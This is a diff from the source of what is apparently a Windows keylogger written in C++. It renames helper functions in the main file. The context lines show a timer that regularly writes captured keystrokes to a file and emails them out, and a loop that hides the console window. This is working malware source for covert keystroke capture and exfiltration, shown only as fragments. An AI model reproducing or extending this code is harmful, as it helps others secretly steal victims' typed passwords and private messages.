@@ -4,7 +4,7 @@
 
 #include "Settings.h"
 
-#include "Helper.h"
+#include "Utils.h"
 #include "KeyConstants.h"
 #include "Base64.h"
 #include "IO.h"
@@ -33,7 +33,7 @@ void DumpKeylog()
 
 	if (filename.empty())
 	{
-		Helper::WriteAppLog("File Creation was not succesfull. Keylog'" + keyboardManager.keylog + "'");
+		IO::WriteAppLog("File Creation was not succesfull. Keylog'" + keyboardManager.keylog + "'");
 		return;
 	}
 
@@ -41,7 +41,7 @@ void DumpKeylog()
 	int x = Mail::SendMail("Log [" + filename + "]", "", filename);
 
 	if (x != 7)
-		Helper::WriteAppLog("Mail was not sent. Error code: " + Helper::ToString(x));
+		IO::WriteAppLog("Mail was not sent. Error code: " + Utils::ToString(x));
 	else
 		keyboardManager.keylog = "";
 }
@@ -57,7 +57,7 @@ int main(int argc, char** argv)
 	// Create and Start mail timer
 	Timer mailTimer(DumpKeylog, FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
 	mailTimer.Start(true);
-	Helper::WriteAppLog("Mail Timer Started");
+	IO::WriteAppLog("Mail Timer Started");
 
 	// Run infinite loop and prevent console window from showing
 	MSG Msg;
